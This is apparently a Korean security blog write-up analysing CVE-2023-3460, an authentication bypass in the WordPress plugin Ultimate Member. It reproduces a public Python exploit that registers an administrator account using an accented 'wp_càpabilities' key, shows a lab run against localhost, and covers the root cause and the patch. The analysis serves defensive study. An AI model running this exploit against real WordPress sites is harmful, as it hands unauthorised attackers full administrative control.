---
title: "[CVE-2023-3460] 취약점 분석 보고서"
description: "Ultimate Member에서 발생하는 인증 우회 취약점"
author: bde574786
date: 2024-12-02 22:43:00 +0900
categories: [One-Day 분석, WordPress]
tags: [WordPress, CVE, Authentication Bypass]
---

<br>

## **1. Description**

CVE-2023-3460은 Wordpress 플러그인 Ultimate Member에서 발견된 **인증 우회(Authentication Bypass)** 취약점이다. 공격자는 인증이 되지 않은 상태에서도 관리자 권한을 획득할 수 있다.

관련 플러그인 정보이다.

[Ultimate Member – User Profile, Registration, Login, Member Directory, Content Restriction & Membership Plugin](https://wordpress.org/plugins/ultimate-member/)

Ultimate Member 플러그인을 활성화하게 되면, 이 플러그인이 Wordpress 사이트의 회원 관리 기능을 담당하게 된다. 즉, 기본적으로 Wordpress의 기본 회원 가입 및 사용자 관리 기능을 Ultimate Member가 대체한다.

## **2. Environment Setting**

> XAMPP & PHP 8.2.12, Wordpress 6.7
> 

### **2.1 Affected Version**

- Ultimate Member < 2.6.7

## **3. PoC**

아래 링크에 있는 PoC를 사용하였으며 들여쓰기 문제가 있으므로 수정하고 사용할 것을 권장한다.

[https://github.com/diego-tella/CVE-2023-3460](https://github.com/diego-tella/CVE-2023-3460)

**3.1 Ultimate Member 플러그인 버전 정보 확인**

플러그인이 취약한 버전이 아닐 경우 `exit` 함수로 프로그램을 종료시킨다.

```python
def checkVersion(target):
    print("[+] Checking if target is vulnerable...")
    targetVersion = target + "/wp-content/plugins/ultimate-member/readme.txt"
    try:
        r = requests.get(targetVersion)
        version = re.search(r"Stable tag: (.*)", r.text).groups()[0]
    except:
        print("[!] Error! Could not find the version...")
        exit()

    version2 = version.replace('.', '')
    if int(version2) < 277:
        print("[!] version found: "+version+" - Target vulnerable!")
    else:
        print("[!] version found: "+version+" - Target is not vulnerable!")
        exit()
```

**3.2 nonce 값 추출**

Wordpress에서 회원가입을 할 때는 nonce 값이 반드시 필요하다.

```python
def getNonce(target):
    print("[+] Getting nonce...")
    headers = {
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0'
    }
    try:
        r = requests.get(target, headers=headers, verify=False)
        nonce = re.search(r"name=\"_wpnonce\" value=\"(.{10})\"", r.text).groups()[0]
        print("[!] Nonce found: "+nonce)
        return nonce
    except:
        print("Error! Could not get the nonce")
        exit()
```

**3.3 관리자 계정 추가**

Wordpress에서 사용되는 특정 폼을 입력하고 `wp_càpabilities[administrator]` 값을 1로 설정하여 관리자 권한을 부여한다.

```python
def addUser(form_id, nonce, target, username, email, password):
    print("[+] Adding a new administrator...")
    data = {
        f'user_login-{form_id}' : username,
        f'user_email-{form_id}': email,
        f'user_password-{form_id}': password,
        f'confirm_user_password-{form_id}': password,
        f'first_name-{form_id}': 'Minsu',
        f'last_name-{form_id}': 'Jeong',
        'form_id': form_id,
        'um_request': '',
        '_wpnonce': nonce,
        'wp_càpabilities[administrator]': 1
    }
    headers = {
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0'
    }
    r = requests.post(f'{target}/index.php/register/', data=data, headers=headers, verify=False, allow_redirects=False)
    
    if r.status_code == 302:
        print("[!] User added! ")
        print("[+] username: "+username)
        print("[+] email: "+email)
        print("[+] password: "+password)
    else:
        print(r.status_code)
        print("[!] Error! Try with a different user")
```

명령줄 인자와 옵션을 확인하고 PoC를 실행한다.

```python
parser = argparse.ArgumentParser(description='Exploit for CVE-2023-3460 for Ultimate Member - Wordpress.')
required = parser.add_mutually_exclusive_group(required=True)
required.add_argument('-t', '--target', type=str, help='Target IP or domain', required=False)
parser.add_argument('-n', '--nonce', type=str, help='Nonce', required=False)
parser.add_argument('-u', '--user', type=str, help='User to be added', required=False, default='gordo')
parser.add_argument('-p', '--password', type=str, help='Password to be added', required=False, default='HackingAnotherWebsite15')
parser.add_argument('-e', '--email', type=str, help='Email to be added', required=False, default='hacked@gmail.com')
parser.add_argument('-l', '--list', type=str, help='List of targets to search', required=False)
required.add_argument('-c', '--check', action='store_true', help='Only check if it is vulnerable')
parser.add_argument('-i', '--id', type=int, help='Form ID (default 6)', default=6)

args = parser.parse_args()
stopScan = args.check
lista = args.list
target = args.target
form_id = args.id
```

폼 아이디는 기본값으로 6이 설정되어 있으나 고유 식별자이므로 환경마다 다를 수 있다. 폼 아이디가 로컬 환경과 동일해야 회원가입에 성공할 수 있으므로 `-i` 옵션의 인자로 정확하게 전달해야 한다.

폼 아이디는 회원가입 창에 hidden으로 숨겨져 있다.

```html
<input type="hidden" name="form_id" id="form_id_27" value="27">
```

다음과 같이 사용자 정보를 인자로 전달해주면 관리자 권한의 사용자를 생성할 수 있다.

```bash
python exploit.py -t http://localhost/wordpress -u bde574786 -p Bde123123 -e bde574786@naver.com -i 27

--- Exploit and scan for CVE-2023-3460 | Made by Diego Tellaroli | https://github.com/diego-tella ---
[+] Checking if target is vulnerable...
[!] version found: 2.6.6 - Target vulnerable!
[+] Getting nonce...
[!] Nonce found: 7bd10cb2aa
[+] Adding a new administrator...
[!] User added
[+] username: bde574786
[+] email: bde574786@naver.com
[+] password: Bde123123
```

임의로 생성한 사용자는 `/wp-admin/user.php`에서 확인할 수 있다.

![image.png](assets/posts/one-day/2024-12-02/img-001.png)

## **4. Analysis**

`wp_usermeta` 테이블에는 사용자와 관련된 메타 데이터가 저장되며, 이 테이블의 `meta_key` 컬럼에는 사용자 역할을 나타내는 `wp_capabilities`도 포함된다.

```bash
mysql> use wordpress;
mysql> select * from wp_usermeta;
```

각 사용자에 대한 역할 정보는 직렬화된 형태로 메타 키 아래에 저장된다. 즉, 이 값을 임의로 변경시키거나 사용자를 생성할 때 값을 같이 넘기면 원하는 권한을 획득할 수 있다.

```
54 |       3 | wp_capabilities                       | a:1:{s:10:"subscriber";b:1;}
74 |       4 | wp_capabilities                       | a:1:{s:6:"editor";b:1;}
94 |       5 | wp_capabilities                       | a:1:{s:11:"contributor";b:1;}
114 |       6 | wp_capabilities                       | a:1:{s:6:"author";b:1;}
134 |       7 | wp_capabilities                       | a:1:{s:13:"administrator";b:1;}
```

`$this->banned_keys` 배열은 다양한 메타 키들을 포함하고 있으며, 이 키들이 요청 바디에 있을 경우 해당 메타 키가 **“밴”** 처리된다. 예를 들어, `cap_key`, `wp_capabilities`, `wp_user_level` 등의 메타 키가 포함되어 있다면 요청 자체가 차단 된다는 것이다.

```php
// ultimate-member/includes/core/class-user.php

public function __construct() {
	global $wpdb;

		$this->banned_keys = array(
			'metabox',
			'postbox',
			'meta-box',
			'dismissed_wp_pointers',
			'session_tokens',
			'screen_layout',
			$wpdb->get_blog_prefix() . 'user-',
			'dismissed',
			'cap_key',
			$wpdb->get_blog_prefix() . 'capabilities',
			'managenav',
			'nav_menu',
			'user_activation_key',
			'level_',
			$wpdb->get_blog_prefix() . 'user_level',
		);
}

public function is_metakey_banned( $meta_key ) {
	$is_banned = false;
	foreach ( $this->banned_keys as $ban ) {
		if ( is_numeric( $meta_key ) || false !== stripos( $meta_key, $ban ) ) {
			$is_banned = true;
			break;
		}
	}

	return $is_banned;
}
```

그러나, Wordpress에는 기본적으로 액센트가 있는 문자(ex: à, è, ì, ò, ù, À, È, Ì, Ò, Ù)를 허용하고 있으므로 `wp_càpabilities=administrator` 나 `wp_càpabilities[administrator] = 1` 와 같은 값을 사용하면 break에 걸리지 않고 `is_metakey_banned` 함수를 우회할 수 있다.

따라서, 위 PoC가 성공적으로 관리자 권한을 가진 사용자를 생성할 수 있게 된다.

## **5. Patch Diff**

Ultimate Member 2.6.7 버전에서는 `remove_accents` 를 사용하여 메타 키에서 액센트를 제거한 후, `banned_keys` 목록과 비교하고 있기 때문에 `wp_càpabilities` 와 같은 변형된 키도 차단한다.

```php
public function is_metakey_banned( $meta_key, $context = '' ) {
	$is_banned = false;
	foreach ( $this->banned_keys as $ban ) {
		if ( is_numeric( $meta_key ) || false !== stripos( $meta_key, $ban ) || false !== stripos( remove_accents( $meta_key ), $ban ) ) {
			$is_banned = true;
			break;
		}
	}

	if ( ! $is_banned && 'submission' === $context && ! in_array( $meta_key, UM()->form()->usermeta_whitelist, true ) ) {
		$is_banned = true;
	}

	return $is_banned;
}
```

## **6. Discussion**

Wordpress가 액센트가 있는 문자를 허용하는 반면, `is_metakey_banned` 함수는 액센트 문자를 제대로 처리하지 않았기 때문에 취약점이 발생한 것으로 보인다. 이를 통해 공격자는 액센트가 포함된 키를 사용하여 메타 키 차단을 우회할 수 있었고 최종적으로 관리자 권한을 가진 사용자를 생성할 수 있었다.